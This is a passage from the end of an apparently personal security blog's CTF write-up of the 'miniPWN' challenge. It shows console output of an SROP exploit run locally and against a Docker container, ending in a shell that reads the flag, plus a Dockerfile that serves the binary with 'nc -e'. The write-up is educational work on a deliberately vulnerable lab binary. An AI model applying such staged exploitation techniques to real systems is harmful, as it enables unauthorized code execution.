<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">❯❯ python minipwn.py local
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/terrance/Dropbox/Blogs/security/content/post/minipwn/pwn/pwn&#39;</span>
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./pwn&#39;</span>: pid <span style="color:#ae81ff">3587974</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending initial payload to leak pointers
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> leaked stack: 0x7ffff9555000
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#ae81ff">2</span> which feeds the first SIGRETURN frame
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Waiting: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Triggering the first SIGRETURN by sending <span style="color:#ae81ff">15</span> junk bytes
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Waiting: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Resetting the binary to a vulnerable read state and sending 2nd SIGRETURN execve payload
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Waiting: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Triggering the last SIGRETURN
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Waiting: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
$ whoami
terrance
$
</code></pre></div><p>Works on my machine! Well, let's test it &ldquo;remote&rdquo;. Here's the CTF's Dockerfile which will set up
the challenge for remote pwning. You can tie the binary together with netcat or socat as well.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-dockerfile" data-lang="dockerfile"><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> alpine:latest</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> mkdir /app<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> pwn /app/<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> flag.txt /app/<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> chmod +x /app/pwn<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> adduser imth -D -s <span style="color:#66d9ef">$(</span>which nologin<span style="color:#66d9ef">)</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">EXPOSE</span><span style="color:#e6db74"> 1337</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">USER</span><span style="color:#e6db74"> imth</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">WORKDIR</span><span style="color:#e6db74"> /app/</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ENTRYPOINT</span> [<span style="color:#e6db74">&#34;nc&#34;</span>, <span style="color:#e6db74">&#34;-lkvp&#34;</span>, <span style="color:#e6db74">&#34;1337&#34;</span>, <span style="color:#e6db74">&#34;-e&#34;</span>, <span style="color:#e6db74">&#34;/app/pwn&#34;</span>]<span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>Run with:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker build -t minipwn .
docker run -p 1337:1337 --rm minipwn
</code></pre></div><p>Then test the exploit remotely:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">❯❯ python minipwn.py remote 172.17.0.1 <span style="color:#ae81ff">1337</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 172.17.0.1 on port 1337: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Run mode: remote
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 172.17.0.1 on port 1337: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Run mode: remote
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending initial payload to leak pointers
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> leaked stack: 0x7ffc178a6000
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#ae81ff">2</span> which feeds the first SIGRETURN frame
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Waiting: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Triggering the first SIGRETURN by sending <span style="color:#ae81ff">15</span> junk bytes
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Waiting: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Resetting the binary to a vulnerable read state and sending 2nd SIGRETURN execve payload
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Waiting: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Triggering the last SIGRETURN
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Waiting: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
$ id
uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>imth<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>imth<span style="color:#f92672">)</span>
$ cat flag.txt
TMHC<span style="color:#f92672">{</span>h4v3_y0u_h34rd_0f_SROP<span style="color:#f92672">}</span>
$
</code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>Hopefully that was clear. I know I'll be referring back to this when I run into a similar problem
again during a CTF. I've provided the challenge binary, commented exploit script, Dockerfile, and
flag file in an archive <a href="minipwn.tar.gz">here</a></p>
<p>The official binaries, write-up and solution script using Mprotect can be found here
<a href="https://github.com/TheManyHatsClub-CTF/TheManyHatsClubCTF/tree/master/2019/pwn/miniPWN">https://github.com/TheManyHatsClub-CTF/TheManyHatsClubCTF/tree/master/2019/pwn/miniPWN</a></p>
<p>If you see any errors or have suggestions on better ways to explain something in the post, please
let me know. This was a learning experience for me as well as an attempt to share newly acquired
knowledge.</p>

    </div>
    
        <div class="nav-left">
    <a class="nav-item" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fsec.alexflor.es%2fpost%2fminipwn%2f" title="Share on Facebook" target="_blank"><span class="fa fa-facebook fa-2x" aria-hidden="true"></span></a>
    <a class="nav-item" href="https://plus.google.com/share?url=https%3a%2f%2fsec.alexflor.es%2fpost%2fminipwn%2f" title="Share on Google+" target="_blank"><span class="fa fa-google-plus fa-2x" aria-hidden="true"></span></a>
    <a class="nav-item" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsec.alexflor.es%2fpost%2fminipwn%2f" title="Share on LinkedIn" target="_blank"><span class="fa fa-linkedin fa-2x" aria-hidden="true"></span></a>
    <a class="nav-item" href="https://twitter.com/home?status=Abusing%20Signals%20with%20SIGROP%20Exploits - https%3a%2f%2fsec.alexflor.es%2fpost%2fminipwn%2f" title="Tweet this" target="_blank"><span class="fa fa-twitter fa-2x"></span></a>
    <a class="nav-item" href="http://www.reddit.com/submit?url=https%3a%2f%2fsec.alexflor.es%2fpost%2fminipwn%2f&title=Abusing%20Signals%20with%20SIGROP%20Exploits" title="Share on Reddit" target="_blank"><span class="fa fa-reddit-alien fa-2x" aria-hidden="true"></span></a>
    
    </div>
    
  </div>
</section>

<section class="section">
  <div class="container">
    <aside><div id="disqus_thread"></div></aside>
    <script type="text/javascript">
      var disqus_shortname = 'blinksec';
      (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
  </div>
</section>


<section class="section">
  <div class="container has-text-centered">
    <div style='margin: auto; width: 250px'><script src="https://www.hackthebox.eu/badge/1496"></script></div>
    
  </div>
</section>


<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/highlight.min.js" integrity="sha256-+bhVTaRmJ/c07eV80nU8gD2cBBF0rYkf1txqXlrbvb0=" crossorigin="anonymous"></script>

<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/go.min.js"></script>

<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/dockerfile.min.js"></script>

<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/javascript.min.js"></script>

<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/python.min.js"></script>

<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/ruby.min.js"></script>

<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/x86asm.min.js"></script>

<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js"></script>
<script> hljs.initHighlightingOnLoad(); </script>



<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-12497311-8', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>



</body>
